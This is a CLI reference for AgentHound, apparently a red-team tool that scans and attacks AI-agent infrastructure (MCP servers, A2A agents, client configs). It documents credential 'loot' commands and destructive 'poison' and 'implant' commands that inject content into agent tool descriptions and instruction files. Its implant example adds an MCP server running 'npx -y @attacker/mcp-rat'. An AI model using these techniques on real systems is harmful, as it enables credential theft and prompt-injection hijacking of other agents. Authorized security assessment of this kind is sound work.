# CLI Reference

AgentHound ships as **two binaries**: `agenthound` (collector) and `agenthound-server` (analysis server). Both use [Cobra](https://github.com/spf13/cobra); all commands support `--help`.

---

## Collector: `agenthound`

### Persistent Flags

| Flag | Env | Default | Description |
|------|-----|---------|-------------|
| `--output` | `AGENTHOUND_OUTPUT` | `./scan-<scan_id>.json` | Write output JSON to this path. `-` for stdout. |
| `--concurrency` | `AGENTHOUND_CONCURRENCY` | `5` | Max parallel collector workers. Used by `scan` as the fallback for `--scan-concurrency` when the latter is not set explicitly. |
| `--host-id` | `AGENTHOUND_HOST_ID` | _(required for artifact-emitting operations)_ | Stable lowercase ID for this collector machine. |
| `--network-realm-id` | `AGENTHOUND_NETWORK_REALM_ID` | _(required for artifact-emitting operations)_ | Stable lowercase ID for the private network visible from this machine. |
| `--log-level` | `AGENTHOUND_LOG_LEVEL` | `info` | `debug`, `info`, `warn`, `error`. |
| `--quiet` | `AGENTHOUND_QUIET=1` | `false` | Suppress non-error log output. |
| `--log-json` | `AGENTHOUND_LOG_JSON=1` | `false` | Emit structured JSON logs. |
| `--rules-bundle` | `AGENTHOUND_RULES_BUNDLE` | | Path to a fingerprint rules bundle (dir or `.tar.gz`). Same-ID rules override shipped rule-backed detectors; `id: jupyter` can replace the versioned native Jupyter detector. Bundles do not register new scanner dispatch targets. Verify cosign signature before use. |

Priority: CLI flag > env var > default.

The collector is offline-by-default. No outbound HTTP, no DB clients, no phone-home. Move the resulting JSON to the analysis box via file copy, SSH pipe, or the UI's drag-drop import.

Both origin IDs must match `[a-z0-9][a-z0-9._-]{0,127}` and remain stable.
They are required whenever the command emits an ingest artifact (`scan`,
`discover`, `loot`, committed `extract`, or a witness-backed committed
`campaign`). They scope local paths, loopback/private endpoints, and lifecycle
coverage to one collection vantage point; they are provenance, not secrets or
an authentication mechanism.

---

### `agenthound scan`

Enumerate MCP servers, A2A agents, and client configs, then write the merged trust graph as JSON.

Scan artifacts use strict ingest wire version `3` with required `origin`
(`host_id` plus `network_realm_id`) and evidence
metadata: constituent `collection` coverage/outcomes, the effective text and
fingerprint `ruleset` semantic digest/entries with canonical matcher
definitions and load failures, and canonical identity-scheme metadata. A
ruleset digest identifies what ran; `authenticity=unverified` explicitly avoids
treating a digest as a trusted signature.

```
agenthound scan [CIDR|host|@targets-file] [flags]
```

**Two modes:**

1. **Local mode** (no positional arg) — runs config + MCP collectors against the local host.
2. **Network mode** (positional arg) — sweeps targets for AI/ML services on standard ports (Ollama 11434, vLLM/LangServe 8000, Qdrant 6333, MLflow 5000, LiteLLM 4000, Jupyter 8888, Open WebUI 3000), then fingerprints each match.

#### Collector Selection

| Flag | Description |
|------|-------------|
| `--config` | Config collector only. |
| `--mcp` | MCP collector only. |
| `--a2a` | A2A collector only. |

When none specified, defaults to config + MCP.

#### Config Collector Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--path` | | Single config file path (overrides auto-discovery). |
| `--paths` | | Comma-separated paths to multiple config files. |
| `--project-dir` | current working directory | Authoritative project root for project config, instruction, and MCP auto-discovery. Missing, inaccessible, or non-directory roots fail closed; they are never treated as an empty project. |
| `--include-credential-values` | `false` | Emit raw credential values instead of SHA-256 hashes. |

Supported clients (12): Claude Desktop, Claude Code, Cursor, VS Code, Windsurf, Continue, Zed, Cline, JetBrains, Kiro, Amazon Q, Augment.

Auto-discovery reads each physical configuration file once and applies every
client format registered for that path. A shared settings file is represented
by one `ConfigFile` with sorted `clients` and one `AgentInstance` per applicable
client. Recognized empty server maps are valid empty configurations; malformed,
unreadable, or oversized files produce non-authoritative failure states while
valid views from the same file are retained. For an explicitly supplied export
whose generic shape is shared by several clients and whose path proves none of
them, the servers are retained under client `unknown` instead of inventing a
specific application.

Credential-named env vars, headers, arguments, and URL components with empty or
whitespace-only values are omitted rather than emitted as exposed credentials
sharing the hash of an empty placeholder. Non-empty values preserve their
exact bytes, including surrounding whitespace, when computing `value_hash`
(recognized HTTP `Authorization` schemes still remove only the protocol scheme
before hashing).

Instruction discovery covers the root project files plus every nested
`<component>/.cursor/rules/**/*.mdc` tree beneath the effective project root.
It does not follow directory symlinks or enter `.git`, and bounds traversal at
100,000 entries, 10,000 Cursor rules, and 4 MiB per file. Static discovery emits
instruction evidence and poisoning findings, but does not claim that every
discovered agent loads every instruction file; `LOADS_INSTRUCTIONS` is reserved
for future evidence that proves client and scope applicability.

#### MCP Collector Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--url` | | URL of a single HTTP MCP server (skips auto-discovery). |

MCP auto-discovery uses the same validated project root, bounded physical-file
reads, parser registry, and failure distinctions as config collection. Usable
servers are retained when another config is malformed or unreadable, but the
MCP authoritative root completes only when discovery and every active server
scope are complete.

For HTTP targets, a successful Initialize proves anonymous access only when the
configured URL contains no userinfo/query and the request used no non-empty
caller-configured header. Recognized `Authorization` and API-key headers retain
their method. Every other non-empty configured header, including cookies,
opaque session headers, `Accept`, and `User-Agent`, produces an unknown
configured-material observation rather than fabricated anonymous evidence.
Empty/whitespace-only values carry no credential material. There is no benign
non-empty header allowlist and the collector does not issue a second
Initialize without the configured headers.

Read-only: calls `tools/list`, `resources/list`, `resources/templates/list`, `prompts/list`. Never calls `tools/call` or `resources/read`.

#### A2A Collector Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--target` | | URL of a single A2A agent. |
| `--targets` | | Comma-separated agent URLs. |
| `--targets-file` | | File with agent URLs (one per line). |
| `--discover-domain` | | Domains to probe for `/.well-known/agent-card.json`. |
| `--auth-token` | | Bearer token for authenticated agents. |
| `--no-verify-jwks` | `false` | Disable remote JWKS (`jku`) resolution during v1 signature verification; verify only against `--a2a-trusted-keys` (offline). |
| `--a2a-trusted-keys` | | Path to a JWKS JSON file of trusted keys used to verify signed agent cards (offline key store). |

At least one of `--target`, `--targets`, `--targets-file`, or `--discover-domain` is required with `--a2a`.

The collector validates v0.3.0 and v1.0.1 required fields but retains invalid
cards as `card_conformant=false` observations. Ordered interfaces are preserved;
entry zero remains preferred. Skill, host, and authentication edges are emitted
only when the facts supporting each edge are conformant. Security requirements
retain their OR-of-AND structure and scopes; a declared scheme is inactive until
referenced by a requirement, and `auth_method` remains `unknown` when a scalar
method would be ambiguous.

Only v1.0.1 cards have a defined signing algorithm. Their ProtoJSON
presence/default rules are applied before RFC 8785 JCS and object-form JWS
verification. Keys resolve first from `--a2a-trusted-keys`, then from the
protected header's `jku`; card-controlled inline `jwks`, top-level `jwks_uri`,
and compact signature strings are not key/signature inputs. Remote `jku` is
HTTPS-only, validates server identity even when target collection uses
`--insecure`, and remains untrusted identity evidence unless the key was
operator-pinned. Each card is limited to 16 signatures and four unique remote
key sources under one aggregate verification deadline; `jku` fragments are
rejected. Results use `unsigned`, `unsupported_version`, `malformed`,
`key_unavailable`, `invalid`, `valid_untrusted`, or `valid_trusted`, with
separate `signature_key_source` and `signature_key_trust` properties.

#### Network Mode Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--ports` | `11434,8000,6333,5000,4000,8888,3000` | Override the default AI-service port set. |
| `--network-scan-concurrency` | `50` | Max parallel TCP connect probes (internally clamped to 4096). HTTP fingerprinting uses at most 64 workers. |
| `--allow-public-targets` | `false` | Allow scanning non-RFC1918 IPs. Requires interactive `AUTHORIZED` prompt. |
| `--allow-large-cidr` | `false` | Allow CIDRs larger than /16 (IPv4) or /112 (IPv6), up to an absolute ceiling of 1,048,576 hosts (exactly /12 IPv4, /108 IPv6) that applies even with this flag. |
| `--authorization-file` | | Path to a written-authorization document. Path + SHA-256 recorded in scan watermark. |
| `--verbose` | `false` | List every discovered host (open ports + candidate kinds). Default is a one-line summary. |

Link-local and multicast addresses are refused unconditionally.

By default network-mode `scan` prints a one-line summary (`N host(s) with at least one open port`) plus a final fingerprint summary; pass `--verbose` to list every host, which can run to thousands of lines on a large sweep. On an interactive terminal a single rewriting progress line is shown during the port sweep and fingerprint phase. `--quiet` (or `AGENTHOUND_QUIET=1`) suppresses the progress line, the per-host summary, and the fingerprint output, leaving only errors. None of this affects the JSON written to `--output`.

Every registered fingerprinter runs once against every open endpoint. Port
mappings prioritize likely candidates but are not eligibility gates, so a real
service on a custom port remains discoverable. A complete response that fails
its matcher is a definitive no-match. Transport/TLS/timeouts, redirects,
authentication challenges, transient statuses, incomplete or oversized bodies,
and matcher runtime failures are indeterminate and make fingerprint coverage
partial, preventing lifecycle reconciliation from deleting prior service facts.

#### Shared Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--scan-concurrency` | `5` | Max parallel connections (local mode). When not set explicitly, falls back to the root `--concurrency` / `AGENTHOUND_CONCURRENCY` value if that is positive. |
| `--timeout` | `120s` | Timeout per server/agent (local MCP/A2A mode). In **network mode**, an explicit positive value applies independently to each TCP probe and HTTP fingerprint task. When omitted/non-positive, TCP defaults to `3s` and HTTP fingerprinting to `5s`; queue wait does not consume the task deadline. |
| `--insecure` | `false` | Skip TLS verification (both MCP and A2A). |
| `--scan-output` | | Explicit output path (overrides `--output`). |

Concurrency precedence for local-mode `scan`: an explicit `--scan-concurrency` always wins; otherwise the root `--concurrency` / `AGENTHOUND_CONCURRENCY` value is used when positive; otherwise the `--scan-concurrency` default (`5`) holds. `--network-scan-concurrency` is a separate knob and is not affected.

#### Example

```bash
# Full local scan: config + MCP enumeration
agenthound scan

# Network sweep of a /24 for exposed AI services
agenthound scan 10.0.0.0/24 --allow-large-cidr

# Pipe directly into the analysis server
agenthound scan --output - | agenthound-server ingest -
```

---

### `agenthound discover`

Protocol-shape probes against a network to discover MCP servers (JSON-RPC initialize) and A2A agents (well-known agent-card). Unlike `scan` which fingerprints fixed AI-service ports, `discover` issues protocol-specific HTTP probes against likely web ports.

```
agenthound discover <cidr|host|@file> [flags]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--mcp` | (both if neither set) | Probe for MCP servers only. |
| `--a2a` | (both if neither set) | Probe for A2A agents only. |
| `--mcp-ports` | `3000,8000,8080,8443` | Override MCP probe port set. |
| `--a2a-ports` | `80,443,3000,8080` | Override A2A probe port set. |
| `--network-scan-concurrency` | `50` | Max parallel HTTP probes. |
| `--timeout` | `5s` | Per-probe HTTP timeout. |
| `--insecure` | `false` | Skip TLS verification on HTTPS probes. |
| `--allow-public-targets` | `false` | Allow probing public IPs (requires `AUTHORIZED` prompt). |
| `--allow-large-cidr` | `false` | Allow CIDRs larger than /16, up to the absolute 1,048,576-host ceiling (applies even with this flag). |
| `--authorization-file` | | Written-authorization doc; recorded in watermark. |
| `--scan-output` | | Output path (defaults to `./discover-<scan_id>.json`). |
| `--verbose` | `false` | List every discovered endpoint (protocol + URL). Default is a one-line summary. |

Like `scan`, `discover` prints a one-line summary by default (`N endpoint(s)`), shows a rewriting progress line on an interactive terminal, and honors `--quiet` / `AGENTHOUND_QUIET=1`. Pass `--verbose` to list each endpoint.

#### Example

```bash
agenthound discover 10.0.0.0/24 --mcp --output -
```

---

### `agenthound loot`

Extract latent secrets from a discovered service. Looters are **read-only by contract**: no state-mutating requests. GET/HEAD is the norm; a few use idempotent, side-effect-free search/lookup POSTs that some APIs expose only via POST (e.g. MLflow `runs/search`, Ollama `/api/show`), each guarded by a `get_only` regression test. Emits Credential nodes and EXPOSES_CREDENTIAL edges for the credential-chain post-processor.

```
agenthound loot <host:port> --type <kind> [flags]
```

#### Safety Gates

- First invocation requires interactive `AUTHORIZED` prompt. After confirmation, writes `~/.agenthound/loot-acknowledged` sentinel (skipped on subsequent runs).
- `--include-credential-values` is OFF by default (emits `value_hash` only).
- `--engagement-id` recorded on every emitted edge for correlation.

#### Core Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--type` | **(required)** | Looter kind: `litellm`, `ollama`, `mlflow`, `qdrant`, `openwebui`, `jupyter`. |
| `--master-key` | | Sugar for `--credential master_key=...`. |
| `--credential` | | Operator-supplied credential as `KEY=VALUE` (repeatable). |
| `--include-credential-values` | `false` | Emit raw values on Credential nodes. |
| `--max-items` | `0` (looter default) | Cap on the enumerated resource per Looter — semantics vary by module. See the [per-Looter default table](../operator/loot/index.md) for defaults + semantics. |
| `--timeout` | `0` (looter default) | Per-probe HTTP timeout. |
| `--engagement-id` | | Engagement identifier for IR coordination. |

#### Per-Module Flags: `--type ollama`

| Flag | Default | Description |
|------|---------|-------------|
| `--include-embeddings` | `false` | Issue one test embedding call via `POST /api/embeddings` with `keep_alive: 0` (evicts the runner immediately after the probe per Ollama `server/sched.go:389-398`; consumes compute). |

> Ollama's HTTP API does not expose a raw-weight download endpoint. See [Ollama loot](../operator/loot/ollama.md#getting-raw-weights-out-of-band) for how to obtain the GGUF weight file out-of-band when the engagement needs it.

#### Per-Module Flags: `--type openwebui`

| Flag | Default | Description |
|------|---------|-------------|
| `--api-key` | | Open WebUI admin API key (or session JWT). When supplied, enumerates upstream provider keys via authenticated `GET /openai/config`, `GET /ollama/config`, `GET /api/v1/retrieval/config`, and `GET /api/v1/retrieval/embedding` (recursive secret walker for KEY/TOKEN/PASSWORD/SUBSCRIPTION/`_SK` suffixes; skips `MODEL`/`ENGINE`/`URL`/`HOST` negatives). Omit for anonymous posture only (`GET /api/config`). |

#### Per-Module Flags: `--type qdrant`

| Flag | Default | Description |
|------|---------|-------------|
| `--include-points` | `false` | Sample per-collection payloads via `POST /collections/{name}/points/scroll` (opt-in; can be large). Emits one `:MCPResource` per point + `PROVIDES_RESOURCE` edge from `QdrantInstance`. |
| `--points-per-collection` | `100` | Cap on payloads sampled per collection when `--include-points` is set. |
| `--max-total-resources` | `5000` | Global cap on `:MCPResource` nodes emitted across all collections (prevents runaway on large deployments). |

Without `--include-points` the Qdrant Looter is pure-GET (`GET /collections` + `GET /collections/{name}`), folding `collection_count`, `collections`, `total_points`, `points_count_unknown`, and `anonymous_listing` onto the `QdrantInstance` node with no Credential nodes.

#### Per-Module Flags: `--type jupyter`

| Flag | Default | Description |
|------|---------|-------------|
| `--max-depth` | `4` | Maximum recursion depth into `/api/contents` subdirectories. Arbitrary safety cap — Jupyter Server places no upper bound on tree depth, so a hostile or accidentally-deep tree could exhaust the Looter without one. |

The Jupyter Looter is pure-GET. It first tries `GET /api/sessions` and root `GET /api/contents/` without credentials. On 401/403 it retries with the bare value from `--credential token=...` (one existing `Bearer ` prefix is normalized) and propagates that bearer through the recursive walk. A 2xx response counts as protected access only after sessions decode as an array or contents decode with a directory `content` array; malformed success bodies are partial failures, not anonymous evidence. Direct URL targets retain their base path and implicit HTTP(S) port. Directories count against the common `--max-items` budget, bounding both emitted resources and recursive traversal. Exhausting that budget or encountering a directory beyond `--max-depth` marks the collection partial so incomplete inventory cannot retire current graph state. It does not perform password login. `auth_required`, `auth_method`, and anonymous-access properties come from protected-operation outcomes; status-page access alone never creates an anonymous-loot conclusion. Mixed endpoint authorization remains `auth_method=unknown` rather than guessing a server-wide mechanism.

#### `--type mlflow` — coverage note

The MLflow Looter enumerates experiments + runs (paginated via `max_results` / `next_page_token` — modern MLflow rejects `experiments/search` without `max_results`) plus the Model Registry: `registered-models/search`, `model-versions/search`, and per-version `get-download-uri`. Each returned artifact URI is emitted as an `:MCPResource` joined to `MLflowServer` via `PROVIDES_RESOURCE`, with `sensitivity` auto-classified by scheme + path (see the [artifact sensitivity heuristic in graph-model.md](graph-model.md)). No new flag; the Model Registry probes are anonymous-readable on stock MLflow deployments.

#### Example

```bash
agenthound loot 172.20.0.10:4000 --type litellm \
    --master-key sk-1234 --engagement-id RTV-DEMO --output -
```

---

### `agenthound poison` (DESTRUCTIVE)

Inject attacker-controlled content into a target. Modifies on-target state (tool descriptions, instruction files).

```
agenthound poison <target> --type <kind> --engagement-id <ID> [flags]
```

`<target>` is module-specific. ContextForge MCP poisoning requires the absolute server-scoped URL described below; local instruction-file poisoning uses its module's local target/file inputs.

#### Safety Gates

1. **Reverter is compile-time mandatory** — every Poisoner must implement a recovery path. Runtime restoration is independently verified and can still be blocked by external policy changes, conflicts, deletion, or loss of access.
2. **`--commit` is OFF by default.** Without it, the Poisoner does a full dry-run (reads original, computes injection, writes receipt with `dry_run=true`) but issues no mutating write.
3. **First invocation requires interactive `AUTHORIZED` prompt.** Writes `~/.agenthound/poison-acknowledged` sentinel (shared with `implant`).
4. **Receipt persisted BEFORE the mutating write.** A persistence failure aborts before any mutating request; once the PUT can run, its durable recovery receipt already exists.

#### Core Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--type` | **(required)** | Poisoner kind: `mcp.tool.description`, `instruction.file`. MCP tool-description mutation requires the ContextForge adapter. |
| `--target-id` | | Logical address of what to poison (e.g. tool name). |
| `--inject` | | Injection content (inline string). |
| `--inject-file` | | Read injection from file (overrides `--inject`). |
| `--mode` | `replace` | How injection combines with original: `replace`, `append`, `prepend`. |
| `--commit` | `false` | Issue the mutating write. |
| `--engagement-id` | **(required)** | Links to `agenthound revert <id>`. |

#### Per-Module Flags: `--type mcp.tool.description`

| Flag | Default | Description |
|------|---------|-------------|
| `--adapter` | **(required)** | Management adapter. The only supported value is `contextforge`. |
| `--management-url` | derived | Optional ContextForge deployment-root override. Preserve any proxy prefix but omit `/v1`; AgentHound appends the fixed API prefix. |
| `--insecure` | `false` | Skip TLS certificate verification on both MCP and ContextForge requests. Credentials remain exact-origin-bound. |

The positional target must be a server-scoped ContextForge MCP URL ending in `/servers/<server-uuid>/mcp` (an optional reverse-proxy prefix and trailing slash are accepted). The v1.0.5 server and tool IDs are accepted only in their exact wire form: lowercase 32-hex text without hyphens. AgentHound derives the server ID and, unless `--management-url` is set, the deployment root from that URL. A management override must be an absolute deployment base without userinfo, query, fragment, or the `/v1` API suffix. AgentHound observes the exact `--target-id` tool through an initialized, paginated official MCP SDK session, then binds it to one ContextForge management row through fixed `GET /v1/servers/<server-uuid>/tools` and `GET /v1/tools/<tool-uuid>` reads. The only write contract is `PUT /v1/tools/<tool-uuid>` with `{"description":"..."}` and an exact `200` JSON response. If the response cannot be fully observed, AgentHound never retries the PUT; read-only reconciliation accepts forward success only for the exact intended text at `V+1` with the pre-recorded operation User-Agent. Provider normalization or failed MCP projection is a failed forward result and triggers one inline cleanup; that cleanup may restore the landed value when exact tool UUID, `V+1`, and forward User-Agent prove attribution. MCP defines none of these management routes.

Both the encoded forward and restoration bodies must fit the 256 KiB request limit before AgentHound persists a live receipt or writes. The exact preflight `ToolRead` and projected response must retain safety headroom within the separate 1 MiB response limit. Null or non-string management descriptions are rejected because MCP projects provider null as empty text while ContextForge cannot restore null through this update contract.

ContextForge v1.0.5 has no non-mutating API that proves the current update validators accept an already stored description byte-for-byte. `ToolRead` does not revalidate stored text, while a no-op PUT would increment version and replace audit attribution. If validation policy changed after a row was created, the forward replacement can succeed but restoration of the original can be rejected. AgentHound reports that failure without claiming recovery; before `--commit`, deployment operators must confirm current-policy acceptance of existing descriptions on installations whose validator configuration changed.

Credentials are not accepted as module flags. `AGENTHOUND_MCP_TOKEN` supplies an explicit MCP bearer value; when unset, AgentHound compares every discovered `Authorization` header for the exact positional URL and rejects conflicting values. `AGENTHOUND_CONTEXTFORGE_TOKEN` independently overrides the management bearer. Without that override, management reuses the resolved MCP bearer only on the same origin; cross-origin management requires the ContextForge override. AgentHound does not mint, fetch, or escalate management credentials; the operator must obtain an authorized bearer through the deployment's ContextForge authentication or token workflow. ContextForge v1.0.5 treats token permissions as a ceiling and database RBAC as the actual operation check. AgentHound accepts a session token or an API token with an empty/wildcard permission ceiling and resolves identity through fixed `GET /v1/auth/email/me`. For non-admins it queries `GET /v1/rbac/my/permissions?team_id=<uuid>` in the exact server/tool team contexts, requiring effective `servers.read`, `tools.read`, and `tools.update` plus direct `ownerEmail` on both objects; team membership alone is not ownership proof. A platform-admin bypass is accepted only from the provider profile. Exact non-wildcard API-token ceilings fail closed because they block the preflight proof. Exact server/tool reads must also succeed. Credentials are origin-bound and never persisted. ContextForge and intervening proxies must preserve AgentHound's operation User-Agent for recovery attribution.

#### Per-Module Flags: `--type instruction.file`

| Flag | Default | Description |
|------|---------|-------------|
| `--file` | | Absolute path to the instruction file (CLAUDE.md, AGENTS.md, .cursorrules). |

#### Example

```bash
# Optional same-origin override; required for cross-origin management.
export AGENTHOUND_CONTEXTFORGE_TOKEN='...'
agenthound poison https://gateway.example/servers/<server-uuid>/mcp \
    --type mcp.tool.description --adapter contextforge \
    --target-id support-lookup \
    --inject-file payload.txt --commit \
    --engagement-id DC35-DEMO
```

---

### `agenthound implant` (DESTRUCTIVE)

Plant persistence in MCP config or instruction files. Installs a malicious server entry or sentinel-bracketed block.

```
agenthound implant <host> --type <kind> --engagement-id <ID> [flags]
```

Same safety gates as `poison` (shared `~/.agenthound/poison-acknowledged` sentinel, `--commit` OFF by default, receipt persistence).

The `<host>` argument is informational for file-based Implanters — recorded on the receipt for engagement correlation, but the modification is local-filesystem only.

#### Core Flags

| Flag | Default | Description |
|------|---------|-------------|
| `--type` | **(required)** | Implanter kind: `mcp.config.malicious-server`, `instruction.file`. |
| `--target-id` | | Per-module logical address (often the absolute file path). |
| `--inject` | | Injection content (JSON for config implants, freeform for instruction). |
| `--inject-file` | | Read injection from file. |
| `--commit` | `false` | Issue the mutating file write. |
| `--engagement-id` | **(required)** | Links to `agenthound revert <id>`. |

#### Per-Module Flags: `--type mcp.config.malicious-server`

| Flag | Default | Description |
|------|---------|-------------|
| `--file` | | Absolute path to the MCP config JSON. |
| `--server-name` | `agenthound-implant-<engagement-id>` | Name for the implanted server entry. |
| `--servers-key` | `mcpServers` | Top-level key in config JSON. Override for VS Code (`servers`), Zed (`context_servers`). |

#### Per-Module Flags: `--type instruction.file`

`instruction.file` is registered as a Poisoner (the agent reads instruction files as part of its prompt, so modification fits the Poisoner contract), but `agenthound implant --type instruction.file` is also accepted — the dispatch falls through to the shared poison runner. The receipt is identical to one produced by `agenthound poison --type instruction.file`, and `agenthound revert <engagement-id>` rolls back either invocation the same way.

| Flag | Default | Description |
|------|---------|-------------|
| `--file` | | Absolute path to the instruction file (CLAUDE.md, AGENTS.md, .cursorrules). Required. |

#### Example

```bash
agenthound implant localhost --type mcp.config.malicious-server \
    --file ~/.cursor/mcp.json \
    --inject '{"command":"npx","args":["-y","@attacker/mcp-rat"]}' \
    --commit --engagement-id DC35-DEMO
```

---

### `agenthound revert`

Attempt recovery for destructive actions recorded for an engagement. Walks all stateful modules, reads matching receipts, and dispatches each module's Revert implementation. Failures remain nonzero and retain their receipts; qualified management-only restoration is reported as `PARTIALLY VERIFIED` rather than cleanly complete.

```
agenthound revert <engagement-id> [flags]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--insecure` | `false` | Skip TLS certificate verification during receipt recovery. Credentials remain exact-origin-bound. |

Retries are conflict-aware: each Reverter checks live target state before writing, and dry-run receipts are no-ops. Receipts are immutable and carry no completion state, so replaying a fully completed **stacked** rollback is not universally idempotent; it may conservatively conflict when the final restored state no longer matches the newest receipt.

Receipts live at `~/.agenthound/state/<module-id>/<engagement-id>.json` and are NOT deleted after revert — they are the audit trail.

Engagement recovery processes every receipt schema supported by its owning module and keeps per-module/per-file LIFO while continuing across independent module failures. ContextForge tool-description recovery supports only its new typed receipt type, version, and provider profile; missing, unknown, or older variants are rejected before networking. Because immutable ContextForge version/User-Agent attribution cannot safely unwind stacked writes to one row, the adapter rejects any new mutation—including dry-run eligibility—while the row carries an AgentHound forward-operation attribution, regardless of engagement. Within one engagement it also rejects a historical same-row receipt whose original description is not yet live; a verified restoration makes the older receipt a safe no-op and permits reuse. It may restore provider-normalized landed text when the receipt's exact tool UUID is still at `V+1` with the forward operation User-Agent; outbound-text equality is not an ownership requirement. When normalization lands text equal to the original but retains `V+1` and the forward User-Agent, recovery issues the one restore PUT so the row reaches `V+2` with the restore User-Agent instead of falsely reporting a no-op. Proven server/tool association drift does not block restoration of that exact attributed row; standalone recovery reports `PARTIALLY VERIFIED` because the management row is verified while MCP verification is unavailable. An association-read error is not detachment proof and cannot select management-only verification. ContextForge and intervening proxies must preserve AgentHound's operation User-Agent. This differs from an active campaign's run-scoped cleanup, which selects one exact run, orders all modules globally by `step_sequence`, and fail-stops on the first unsafe dependent step.

#### Example

```bash
agenthound revert DC35-DEMO
```

---

### `agenthound rules`

Manage the YAML detection rules engine.

#### `agenthound rules list`

```bash
agenthound rules list [flags]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--format` | `table` | `table` or `json`. |
| `--collector` | | Filter: `mcp`, `a2a`, `config`, `all`. |
| `--severity` | | Filter: `critical`, `high`, `medium`, `low`, `info`. |
| `--tag` | | Filter by tag. |
| `--builtin-only` | `false` | Show only embedded rules. |
| `--custom-only` | `false` | Show only custom rules. |

Custom rules are loaded from `$AGENTHOUND_RULES_DIR` or `~/.agenthound/rules/`.

#### `agenthound rules validate`

```bash
agenthound rules validate [path] [--strict]
```

Validates rule definitions for correctness and runs inline tests. If path is a file, validates that rule. If a directory, validates all `.yaml` files in it. No path = all loaded rules.

`--strict` treats warnings (including missing test cases) as errors.

#### `agenthound rules test`

```bash
agenthound rules test [path] [flags]
```

| Flag | Default | Description |
|------|---------|-------------|
| `--format` | `table` | `table` or `json`. |
| `--verbose` | `false` | Show passing test cases, not just failures. |

Exits with code 1 if any test fails.

#### Example

```bash
agenthound rules list --severity critical --format json
agenthound rules validate ./custom-rules/ --strict
agenthound rules test
```

---

### `agenthound extract`

Extract training signals from model artifacts (v0.5). Parses GGUF weight files and detects statistical outlier embeddings likely added during fine-tuning.

```bash
agenthound extract <source-node-id> --type embedding-invert \
    --artifact /tmp/loot/model.bin --commit --engagement-id DC35-DEMO
```

`<source-node-id>` is the already-established `AIModel` object ID, not a URL,
model name, or artifact path. It must use AgentHound's canonical
`sha256:` plus 64 lowercase hexadecimal representation. The extractor carries
that identity as an empty `reference_only` endpoint so strict ingest can close
the emitted edges without inventing model properties.

| Flag | Default | Description |
|------|---------|-------------|
| `--type` | (required) | Extractor kind (`embedding-invert`) |
| `--artifact` | (required) | Path to a local GGUF weight file (obtained out-of-band; see [Ollama loot](../operator/loot/ollama.md#getting-raw-weights-out-of-band)) |
| `--commit` | `false` | Emit ingest data (default: dry-run summary) |
| `--engagement-id` | (required) | Engagement correlation key |
| `--confidence-threshold` | `3.0` | Z-score threshold for outlier detection |
| `--max-signals` | `1000` | Cap on emitted ExtractedTrainingSignal nodes |

---

### `agenthound campaign`

Run an ordered campaign scenario against a known service. A scenario either verifies a *predicted* graph relationship with *observed* evidence from a server-exported witness, or performs a standalone reversible target-mutation validation. Witnesses and graph evidence are scenario-specific, not universal campaign inputs or outputs.

The runner ships two scenarios. The first is **`cred-reach`** — a READ-ONLY differential credential-reach oracle. Given a witness for a predicted credential-gated `CAN_REACH` finding, it reads the exact predicted MCP resource once **without** authentication (control) and once **with** a hash-matched credential (authed), then classifies the pair:

| Control (unauth) | Authed | Outcome | Emits |
|------------------|--------|---------|-------|
| denied at `initialize` or exact `resource_read` | exact `resource_read` allowed | `credential_gated_reach_verified` | per-agent `CREDENTIAL_REACH_VERIFIED` (upgrades only the source-agent CAN_REACH finding) |
| allowed | allowed | `anonymous_access_observed` | `PUBLIC_ACCESS_OBSERVED` (a fact) |
| allowed | denied | `anonymous_access_observed` + credential rejected | `PUBLIC_ACCESS_OBSERVED` |
| exact `resource_read` denied | exact same `resource_read` denied | `not_observed` | nothing — retires only this agent's prior verification |
| 404 / malformed auth / protocol error / ambiguous / timeout | (any) | `indeterminate` | nothing — prior evidence preserved |

Initialization denial is never a valid negative. Only a typed HTTP response that
actually observed status `401` or `403` is a definitive denial; auth-like target
text and JSON-RPC messages are indeterminate. Any missing/wrong resource,
malformed/protocol response, timeout, incomplete stage, or budget exhaustion is
indeterminate and preserves prior credential evidence. A successful control
read may still emit the independent anonymous-access fact without retiring
credential evidence. The scenario mutates nothing, so cleanup is
`not_applicable`.

```bash
# 1. export the witness on the analysis box (server)
agenthound-server witness --finding <finding-id> > witness.json

# 2. supply the credential material OUT OF BAND (env var or stdin) — never a flag
export AGENTHOUND_CAMPAIGN_CREDENTIAL='sk-...'

# 3. run the read-only differential probes and emit graph evidence
agenthound campaign https://mcp.example/mcp --scenario cred-reach \
    --witness witness.json --engagement-id DC35-DEMO --commit --output - \
  | agenthound-server ingest -
```

| Flag | Default | Description |
|------|---------|-------------|
| `--scenario` | (required) | Scenario ID to run (`cred-reach` or `mcp-poison-roundtrip`) |
| `--witness` | `cred-reach`: required | Path to the server-exported witness JSON, or `-` for stdin; not used by `mcp-poison-roundtrip` |
| `--engagement-id` | (required) | Engagement correlation key |
| `--commit` | `false` | Execute the selected scenario; default is plan-only. `cred-reach` probes and emits evidence, while `mcp-poison-roundtrip` mutates and restores. |
| `--insecure` | `false` | Skip TLS certificate verification for scenario network requests; roundtrip applies it to both MCP and ContextForge surfaces. |
| `--timeout` | `30s` | Total forward scenario elapsed-time limit; cleanup, where applicable, uses a separate bounded non-cancellable context |
| `--credential-env` | `AGENTHOUND_CAMPAIGN_CREDENTIAL` | `cred-reach` only: env var holding the out-of-band credential material |
| `--credential-stdin` | `false` | `cred-reach` only: read the credential material from stdin instead of an env var |

**Credential material is supplied out of band** (env var or stdin) and hash-matched locally against the witness `value_hash`; the raw value is never logged, never a flag, and never written to the graph. A hash-only credential (no executable material) is a **precondition failure** (not runnable) — distinct from an `indeterminate` outcome.

